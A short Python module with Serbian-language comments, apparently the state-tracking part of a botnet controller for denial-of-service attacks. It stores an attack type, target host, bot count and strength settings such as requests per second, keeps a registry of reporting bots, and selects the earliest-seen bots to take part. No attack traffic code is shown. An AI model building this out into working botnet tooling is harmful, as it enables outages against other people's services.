import time

attack_state = { # za napad
    "attack_type": None, # None - nema napada, sve ostalo - tip  
    "target_host": None,   
    "bot_count": 0,        
    "params": {} # jacina napada (rps, konkurentne konekcije...)            
}

bot_registry = {} # dinamicki se dodaju idevi botova kad se jave


def fill_registry(bot_id, stats):

    if bot_id not in bot_registry:

        bot_registry[bot_id] = {
            "first_seen_at": time.time(),
            "last_stats": stats # statistika koju bot salje, app.py
        }

    else:
        bot_registry[bot_id]["last_stats"] = stats 


def first_seen_at(bot_id): # vraca vr za bot id
    return bot_registry[bot_id]["first_seen_at"]


def is_selected(bot_id): 

    bot_ids = list(bot_registry.keys()) # lista ideva (str)
    bot_ids.sort(key=first_seen_at) # sortirano po vr rastucea

    return bot_id in bot_ids[:attack_state["bot_count"]] # slicing na bot count, true ako je u listi